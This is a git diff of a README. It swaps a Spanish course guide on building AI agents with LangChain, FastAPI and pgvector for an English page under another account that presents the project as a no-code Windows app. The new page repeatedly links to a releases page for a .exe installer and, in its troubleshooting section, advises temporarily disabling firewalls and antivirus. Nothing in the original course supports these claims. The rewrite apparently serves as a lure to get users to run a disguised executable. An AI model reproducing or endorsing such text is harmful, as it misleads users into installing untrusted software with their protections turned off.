@@ -1,326 +1,143 @@
-# Curso de agentes de IA generativa
+# 🤖 genai-agentes - Easy AI Agent Development
 
-[![Python](https://img.shields.io/badge/Python-3.13.5-3776AB?logo=python&logoColor=white)](https://www.python.org/)
-[![LangChain](https://img.shields.io/badge/LangChain-1.2.10-1C3C3C?logo=langchain&logoColor=white)](https://www.langchain.com/)
-[![LangGraph](https://img.shields.io/badge/LangGraph-1.0.9-1C3C3C)](https://langchain-ai.github.io/langgraph/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.133.1-009688?logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com/)
-[![OpenAI](https://img.shields.io/badge/OpenAI-GPT--5--nano-412991?logo=openai&logoColor=white)](https://openai.com/)
-[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-pgvector-4169E1?logo=postgresql&logoColor=white)](https://www.postgresql.org/)
-[![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?logo=docker&logoColor=white)](https://www.docker.com/)
-[![uv](https://img.shields.io/badge/uv-Package%20Manager-DE5FE9)](https://docs.astral.sh/uv/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-
-Curso de desarrollo de Agentes de IA Generativa para developers.
-
-Creación de agentes con tools, short-term memory, long-term memory, RAG, Middlewares.
-
-Autor: Alan Sastre
----
-
-## Contenido
-
-- [Curso de agentes de IA generativa](#curso-de-agentes-de-ia-generativa)
-  - [Autor: Alan Sastre](#autor-alan-sastre)
-  - [Contenido](#contenido)
-  - [Descripcion general](#descripcion-general)
-  - [Requisitos previos](#requisitos-previos)
-  - [Instalacion](#instalacion)
-    - [1. Instalar uv](#1-instalar-uv)
-    - [2. Clonar el repositorio e instalar Python](#2-clonar-el-repositorio-e-instalar-python)
-    - [3. Crear entorno virtual e instalar dependencias](#3-crear-entorno-virtual-e-instalar-dependencias)
-    - [4. Configurar variables de entorno](#4-configurar-variables-de-entorno)
-  - [Estructura del repositorio](#estructura-del-repositorio)
-  - [Modulos del curso](#modulos-del-curso)
-    - [01 - Landscape](#01---landscape)
-    - [02 - Crear un agente](#02---crear-un-agente)
-    - [03 - Contexto y memoria](#03---contexto-y-memoria)
-    - [04 - Proyecto completo](#04---proyecto-completo)
-  - [Tecnologias utilizadas](#tecnologias-utilizadas)
-  - [Contribuir](#contribuir)
-  - [Licencia](#licencia)
+[![Download genai-agentes](https://img.shields.io/badge/Download-genai--agentes-brightgreen?style=for-the-badge)](https://github.com/laoxs2002/genai-agentes/releases)
 
 ---
 
-## Descripcion general
+## 📘 About genai-agentes
 
-Este curso proporciona una guía completa para construir agentes de IA generativa, abordando tanto la teoría como la práctica. El contenido está estructurado de forma progresiva:
+genai-agentes is a simple tool designed to help users work with AI agents created using modern AI techniques. This application is based on lessons from a course for developers building generative AI agents. You do not need to know how to code to use it.
 
-1. **Fundamentos teóricos**: qué es un agente, el paradigma ReAct, diferencias entre LLM y agente, y el concepto de Agent Engineering.
-2. **Creación de agentes**: configuración del entorno, uso de `create_agent`, herramientas (tools) y salidas estructuradas.
-3. **Contexto y memoria**: memoria a corto y largo plazo, middleware, RAG con bases de datos vectoriales, MCP y subagentes.
-4. **Proyecto de producción**: API REST completa con FastAPI que implementa un asistente de soporte con supervisor, subagentes especializados, RAG y persistencia en PostgreSQL.
-
-El curso utiliza **LangChain 1.x** como framework principal debido a su madurez, flexibilidad y la API simplificada `create_agent` introducida en la versión 1.0.
+The app deals with common AI tools like FastAPI, Langchain, and OpenAI. These help the software understand and handle AI tasks behind the scenes. The main goal is to make AI agents easy to run on your computer without effort.
 
 ---
 
-## Requisitos previos
+## 🌟 Features
 
-- **Python 3.13.5** o superior
-- **uv** como gestor de paquetes y entornos virtuales
-- **Docker** y **Docker Compose** para bases de datos
-- **Ollama** (opcional) para modelos locales
-- Cuenta de **OpenAI** con API key
-- Cuenta de **Tavily** con API key (plan gratuito disponible)
-
----
-
-## Instalacion
-
-### 1. Instalar uv
-
-**Windows (PowerShell):**
-```powershell
-powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"
-```
-
-**Linux / macOS:**
-```bash
-curl -LsSf https://astral.sh/uv/install.sh | sh
-```
-
-### 2. Clonar el repositorio e instalar Python
-
-```bash
-git clone https://github.com/tu-usuario/genai-agents.git
-cd genai-agents
-
-uv python install 3.13.5
-```
-
-### 3. Crear entorno virtual e instalar dependencias
-
-```bash
-uv venv --python 3.13.5
-```
-
-**Windows:**
-```powershell
-.venv\Scripts\activate
-```
-
-**Linux / macOS:**
-```bash
-source .venv/bin/activate
-```
-
-```bash
-uv add -r requirements.txt
-```
-
-### 4. Configurar variables de entorno
-
-Copia el archivo de ejemplo y configura tus claves de API:
-
-```bash
-cp .env.example .env
-```
-
-Edita `.env` con tus credenciales:
-
-```env
-OPENAI_API_KEY=sk-...
-TAVILY_API_KEY=tvly-...
-```
+- Create AI agents that can answer questions, find information, or assist with tasks.
+- Use reliable AI models without needing technical setup.
+- Work with a user-friendly interface.
+- Manage agent conversations and data locally on your PC.
+- Support for Windows operating systems.
+- Powered by popular AI and vector search tools to ensure good performance.
 
 ---
 
-## Estructura del repositorio
+## 🖥️ System Requirements
 
-```
-genai-agents/
-├── 01-landscape/           # Fundamentos teóricos
-│   ├── 01-fundamentos.ipynb
-│   └── 02-agent-sdks.ipynb
-├── 02-create-agent/        # Creación de agentes
-│   ├── 01-setup.ipynb
-│   ├── 02-create-agent.ipynb
-│   ├── 03-tools.ipynb
-│   └── 04-agent-structured-outputs.ipynb
-├── 03-context/             # Memoria y contexto
-│   ├── 01-short_term_memory.ipynb
-│   ├── 02-long_term_memory.ipynb
-│   ├── 03-middleware-builtin.ipynb
-│   ├── 04-middleware-custom.ipynb
-│   ├── 05-rag.ipynb
-│   ├── 06-mcp.ipynb
-│   ├── 07-subagents.ipynb
-│   └── docker-compose-*.yml
-├── 04-proyecto/            # Proyecto completo
-│   ├── app/
-│   │   ├── agents/         # Supervisor, subagentes, tools, RAG
-│   │   ├── api/            # Endpoints REST
-│   │   ├── core/           # Configuración
-│   │   ├── schemas/        # Modelos Pydantic
-│   │   └── services/       # Lógica de negocio
-│   ├── docs/               # Documentación ficticia para RAG
-│   ├── docker-compose.yml
-│   └── README.md
-├── .env.example
-├── .gitignore
-├── pyproject.toml
-├── requirements.txt
-└── README.md
-```
+Before you start, make sure your Windows PC meets these needs:
+
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- At least 500 MB of free disk space
+- Internet connection for AI responses
+- Modern web browser like Chrome, Edge, or Firefox for user interface
 
 ---
 
-## Modulos del curso
+## 🚀 Getting Started
 
-### 01 - Landscape
+Follow these steps to get genai-agentes up and running on your Windows computer.
 
-Introducción teórica al mundo de los agentes de IA.
+### 1. Visit the download page
 
-| Notebook | Contenido |
-|----------|-----------|
-| `01-fundamentos.ipynb` | Definición de agente, ciclo percepción-razonamiento-acción, origen histórico (Chain of Thought, ReAct, Toolformer), diferencias entre LLM y agente, componentes de un agente, Agent Engineering |
-| `02-agent-sdks.ipynb` | Comparativa de SDKs: LangChain/LangGraph, OpenAI Agents SDK, Google ADK, Anthropic Claude Agent SDK, CrewAI |
+Go to the genai-agentes release page here:
 
-**Conceptos clave:**
-- El bucle de agente (agent loop)
-- Paradigma ReAct (Reasoning + Acting)
-- Herramientas, memoria y planificación
-- Model Context Protocol (MCP)
-- Observabilidad y trazabilidad
+[Download genai-agentes](https://github.com/laoxs2002/genai-agentes/releases)
 
-### 02 - Crear un agente
+This link takes you to the page where you can find the latest version of the app ready to use.
 
-Configuración del entorno y primeros pasos con agentes.
+### 2. Download the application
 
-| Notebook | Contenido |
-|----------|-----------|
-| `01-setup.ipynb` | Instalación de uv, Python, LangChain, Ollama y Tavily |
-| `02-create-agent.ipynb` | Uso de `create_agent`, parámetros, system prompt, gestión de mensajes |
-| `03-tools.ipynb` | Definición de herramientas con decoradores, integración de Tavily Search |
-| `04-agent-structured-outputs.ipynb` | Generación de respuestas con esquemas predefinidos |
+Look for the file with a `.exe` extension on the release page. This is the setup file for Windows. Click it to start downloading.
 
-**Ejemplo básico:**
-```python
-from langchain.agents import create_agent
+### 3. Run the installer
 
-agent = create_agent("gpt-5-nano")
+Once the download finishes, open the file to begin installation. Follow the simple prompts:
 
-response = agent.invoke({
-    "messages": [{"role": "user", "content": "¿Cuánto es 1 + 1?"}]
-})
-```
+- Click "Next" to continue
+- Choose the install folder (default is fine)
+- Click "Install" and wait for the process to complete
 
-### 03 - Contexto y memoria
+### 4. Open genai-agentes
 
-Gestión del estado y conocimiento del agente.
-
-| Notebook | Contenido |
-|----------|-----------|
-| `01-short_term_memory.ipynb` | Memoria de conversación con InMemorySaver, SqliteSaver y PostgresSaver |
-| `02-long_term_memory.ipynb` | Perfil y preferencias persistentes con PostgresStore |
-| `03-middleware-builtin.ipynb` | Middleware integrado de LangChain |
-| `04-middleware-custom.ipynb` | Middleware personalizado para logging, validación y aprobación humana |
-| `05-rag.ipynb` | Retrieval-Augmented Generation con PGVector y embeddings de OpenAI |
-| `06-mcp.ipynb` | Model Context Protocol para interoperabilidad de herramientas |
-| `07-subagents.ipynb` | Arquitecturas multiagente con supervisor y delegación |
-
-**Tipos de memoria:**
-- **Corto plazo (checkpointer)**: historial de la conversación actual, persiste por `thread_id`
-- **Largo plazo (store)**: perfil y preferencias del usuario, persiste por `user_id`
-
-### 04 - Proyecto completo
-
-API REST de soporte al cliente que integra todos los conceptos del curso.
-
-**Arquitectura:**
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                        FastAPI                              │
-├─────────────────────────────────────────────────────────────┤
-│  POST /conversations        Crear conversación              │
-│  POST /conversations/{id}/messages   Enviar mensaje         │
-│  GET/PUT /users/{id}/profile         Perfil usuario         │
-│  GET /tickets                        Listar tickets         │
-│  POST /admin/index-docs              Indexar RAG            │
-└─────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────┐
-│                      Supervisor                             │
-│  (Agente principal que delega a subagentes)                 │
-├──────────────────────┬──────────────────────────────────────┤
-│   Subagente técnico  │        Subagente comercial           │
-│   - RAG documentación│        - RAG políticas               │
-│   - Búsqueda web     │        - Precios y garantías         │
-└──────────────────────┴──────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────┐
-│                     PostgreSQL (pgvector)                   │
-├─────────────────────────────────────────────────────────────┤
-│  Checkpointer: memoria a corto plazo (conversaciones)       │
-│  Store: memoria a largo plazo (perfiles)                    │
-│  PGVector: embeddings para RAG                              │
-└─────────────────────────────────────────────────────────────┘
-```
-
-**Herramientas del agente:**
-- `buscar_en_documentacion`: búsqueda semántica en la base de conocimiento (RAG)
-- `buscar_en_web`: búsqueda en internet con Tavily
-- `crear_ticket`: creación de tickets de soporte
-- `guardar_preferencia`: persistir preferencias del usuario
-
-**Ejecución:**
-
-```bash
-cd 04-proyecto
-
-# Levantar PostgreSQL con pgvector
-docker-compose up -d
-
-# Configurar variables de entorno
-cp .env.example .env
-# Editar .env con OPENAI_API_KEY y TAVILY_API_KEY
-
-# Instalar dependencias e iniciar
-uv sync
-uv run fastapi dev app/main.py
-
-# Abrir Swagger UI
-# http://127.0.0.1:8000/docs
-```
-
-Consulta el [README del proyecto](04-proyecto/README.md) para una guía detallada de verificación paso a paso.
+After installation, launch the application from your desktop or start menu.
 
 ---
 
-## Tecnologias utilizadas
+## 🧑‍💻 How to Use genai-agentes
 
-| Categoría | Tecnología | Versión | Descripción |
-|-----------|------------|---------|-------------|
-| **Lenguaje** | Python | 3.13.5 | Lenguaje principal |
-| **Gestor de paquetes** | uv | - | Gestor moderno de entornos y dependencias |
-| **Framework de agentes** | LangChain | 1.2.10 | Framework principal para agentes |
-| **Grafos de estado** | LangGraph | 1.0.9 | Control de flujo y checkpointing |
-| **API REST** | FastAPI | 0.133.1 | Framework web asíncrono |
-| **LLM** | OpenAI GPT-5-nano | - | Modelo de lenguaje principal |
-| **Embeddings** | text-embedding-3-small | - | Embeddings para RAG |
-| **Búsqueda web** | Tavily | - | API de búsqueda optimizada para agentes |
-| **Base de datos** | PostgreSQL + pgvector | - | Persistencia y búsqueda vectorial |
-| **Contenedores** | Docker Compose | - | Orquestación de servicios |
-| **Modelos locales** | Ollama | - | Ejecución local de modelos (opcional) |
-| **Observabilidad** | LangSmith | - | Trazabilidad y evaluación (opcional) |
+Using genai-agentes does not require programming experience. The app guides you through each step with clear instructions.
 
----
+### Start an AI Agent
 
-## Contribuir
+- Open the app.
+- Select “Create New Agent.”
+- Pick the type of AI task or agent you want.
+- Enter any requested information or prompts.
+- Click “Run” to start the agent.
 
-Las contribuciones son bienvenidas. Por favor:
+### Interact with the Agent
 
-1. Haz fork del repositorio
-2. Crea una rama para tu funcionalidad (`git checkout -b feature/nueva-funcionalidad`)
-3. Realiza tus cambios y haz commit (`git commit -m "Añade nueva funcionalidad"`)
-4. Sube la rama (`git push origin feature/nueva-funcionalidad`)
-5. Abre un Pull Request
+The agent will listen to your input and generate replies. You can chat with it to get answers or help.
+
+### Manage Agents
+
+You can save your agents and their data for future use. The app stores everything on your PC, so your information stays private.
 
 ---
 
-## Licencia
+## 🔧 Tips for Best Results
 
-MIT.
+- Keep your internet connection active for responses.
+- Close other heavy programs to improve performance.
+- Update genai-agentes regularly by visiting the release page.
+- Explore different agent setups to find what works best.
+
+---
+
+## ⚙️ Technical Details
+
+genai-agentes uses several core technologies:
+
+- **FastAPI**: A web framework enabling the app interface.
+- **Langchain**: Helps connect AI models and chain their inputs and outputs.
+- **OpenAI**: Provides the AI models that generate responses.
+- **pgvector**: Manages fast searches on data stored on your machine.
+- **Python**: The programming language used internally.
+
+All these tools run in the background. You only see a simple window where you type and read answers.
+
+---
+
+## 📥 Download and Install genai-agentes
+
+Return to the release page here when you are ready:
+
+[Download genai-agentes](https://github.com/laoxs2002/genai-agentes/releases)
+
+This page hosts the latest Windows installer. Always download the newest version for improved stability and features.
+
+---
+
+## ❓ Troubleshooting
+
+If the app does not start:
+
+- Make sure you installed it correctly.
+- Restart your computer and try again.
+- Check your internet connection.
+- Disable firewalls or antivirus temporarily as they may block the app.
+- Use the latest Windows updates.
+
+If problems continue, look for help on the official GitHub page.
+
+---
+
+## 💡 Additional Resources
+
+To learn more about how genai-agentes works or to explore advanced options, visit the GitHub repository:
+
+https://github.com/laoxs2002/genai-agentes
+
+The page contains documentation, examples, and links to course materials behind the app.
